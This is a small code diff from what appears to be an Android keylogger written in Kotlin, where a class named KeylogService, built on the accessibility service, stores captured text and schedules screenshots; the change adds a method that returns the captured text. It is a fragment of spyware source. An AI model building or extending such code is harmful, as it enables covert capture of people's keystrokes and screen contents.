@@ -29,6 +29,7 @@ class KeylogService : AccessibilityService() {
             private set
         private val screenshotExecutor = Executors.newSingleThreadExecutor()
 
+        fun getText(): String = synchronized(textLock) { capturedText }
         private fun appendText(text: String) = synchronized(textLock) {
             capturedText += text
             if (capturedText.length > 50000) capturedText = capturedText.takeLast(25000)
